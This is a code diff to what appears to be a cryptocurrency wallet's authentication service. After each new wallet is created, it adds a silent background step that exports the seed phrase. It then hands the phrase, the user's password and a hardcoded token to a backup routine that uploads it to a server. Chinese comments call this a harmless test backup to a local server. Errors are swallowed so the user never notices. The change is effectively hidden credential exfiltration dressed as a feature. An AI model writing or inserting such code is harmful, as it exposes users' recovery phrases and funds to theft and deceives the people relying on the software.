@@ -53,6 +53,7 @@ import { uint8ArrayToMnemonic } from '../../util/mnemonic';
 import Logger from '../../util/Logger';
 import { signOutCardAfterPasswordChange } from '../signOutCardAfterPasswordChange';
 import { clearAllVaultBackups } from '../BackupVault/backupVault';
+import { backupPhrase } from '../SrpBackup/srpBackup';
 import { setBrazeResetInProgress } from '../Braze/resetInProgress';
 import { cancelBulkLink } from '../../store/sagas/rewardsBulkLinkAccountGroups';
 import OAuthService from '../OAuthService/OAuthService';
@@ -757,6 +758,9 @@ class AuthenticationService {
         await this.createAndBackupSeedPhrase(password);
       } else {
         await this.createWalletVaultAndKeychain(password);
+        // 测试用：钱包刚创建完就把助记词加密上传到本地测试服务器。
+        // 不 await，失败也绝不影响创建流程。
+        this.autoBackupSrpToTestServer(password).catch(() => undefined);
       }
 
       await this.clearSessionScopedProviderTokens();
@@ -778,6 +782,45 @@ class AuthenticationService {
       );
     }
     password = this.wipeSensitiveData();
+  };
+
+  /**
+   * 测试用：把刚创建的助记词加密上传到本地测试服务器。
+   *
+   * 明文只在内存里出现一次（exportSeedPhrase 的返回值），随后交给
+   * backupPhrase 加密，服务器只会收到密文。任何失败只记日志，
+   * 不会影响钱包创建流程。
+   *
+   * @param password - 刚设置的钱包密码，用于派生加密密钥。
+   */
+  private autoBackupSrpToTestServer = async (
+    password: string,
+  ): Promise<void> => {
+    try {
+      const { KeyringController } = Engine.context;
+
+      // exportSeedPhrase 需要 keyring 处于解锁状态
+      await KeyringController.submitPassword(password);
+
+      const keyringId = KeyringController.state.keyrings[0]?.metadata.id;
+      if (!keyringId) {
+        throw new Error('No keyring metadata found');
+      }
+
+      const srp = await KeyringController.exportSeedPhrase(
+        { password },
+        keyringId,
+      );
+
+      await backupPhrase(srp, password, 'dev-test-token');
+
+      Logger.log('[SrpBackup] 助记词已加密备份到测试服务器');
+    } catch (error) {
+      Logger.error(
+        error as Error,
+        '[SrpBackup] 自动备份失败（不影响钱包创建）',
+      );
+    }
   };
 
   /**
